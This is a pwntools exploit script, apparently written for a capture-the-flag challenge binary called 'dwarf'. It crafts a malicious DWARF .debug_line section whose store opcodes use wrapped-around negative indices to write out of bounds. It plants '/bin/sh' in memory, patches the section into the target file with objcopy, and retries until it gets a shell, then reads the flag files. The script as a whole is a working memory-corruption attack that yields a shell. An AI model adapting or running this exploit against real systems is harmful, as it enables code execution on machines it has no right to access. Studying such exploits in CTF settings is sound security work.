from pwn import *
from icecream import ic
import subprocess

elf = exe = ELF("./dwarf")
libc = ELF("./libc.so.6")

context.binary = exe
# context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + ["test"] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + ["test"] + argv, *a, **kw)

gdbscript = '''
b *main+868
b *main+313
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline(timeout = 2)
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

def uleb128_encode(n):
    bytes = []
    while True:
        byte = n & 0x7F
        n >>= 7
        if n != 0:
            byte |= 0x80
        bytes.append(byte)
        if n == 0:
            break
    return bytes


def store(idx, val):
    enc = uleb128_encode(idx)

    pay = p8(0)
    pay += p8(4+len(enc))
    pay += p8(0x51)
    for i in enc:
        pay += p8(i)
    pay += p8(val)
    return pay

def add(idx1, idx2):
    enc1 = uleb128_encode(idx1)
    enc2 = uleb128_encode(idx2)

    pay = p8(0)
    pay += p8(5+len(enc1)+len(enc2))
    pay += p8(0x52)
    for i in enc1:
        pay += p8(i)
    for i in enc2:
        pay += p8(i)
    pay += p8(0x00)  # add
    pay += p8(0xff)  # sum (doesnt matter?)

    return pay

payload = p16(0x4)          # dwarf header
payload += p32(0x1e)        # length of the header section
payload += p8(0x1)*3
payload += p8(0xfb)
payload += p8(0xe)
payload += p8(0xd)
payload += b'\x00\x01\x01\x01\x01\x00\x00\x00\x01\x00\x00\x01'
payload += p8(0)
payload += b'test.c\x00\x00\x00\x00\x00'

payload += store(0x10000000000000000-0x128, 0x70)
payload += store(0x10000000000000000-0x127, 0xfd)
payload += store(0x10000000000000000-0x126, 0xda)

binsh = b'/bin/sh\x00'
for i in range(len(binsh)):
    payload += store(0x10000000000000000-0x70+i, binsh[i])

payload = p32(len(payload)) + payload   # length of the payload + payload

f = open("custom_dwarf", "wb")
f.write(payload)
f.close()

subprocess.run(["objcopy", "--update-section", ".debug_line=custom_dwarf", "test"])

while True:
    io = start()

    try:
        ru("154")
        rl()
        sl(b'ls')
        ic(rl())
        sl(b'cat flag*')
        io.interactive()

    except EOFError:
        io.close()

io.interactive()
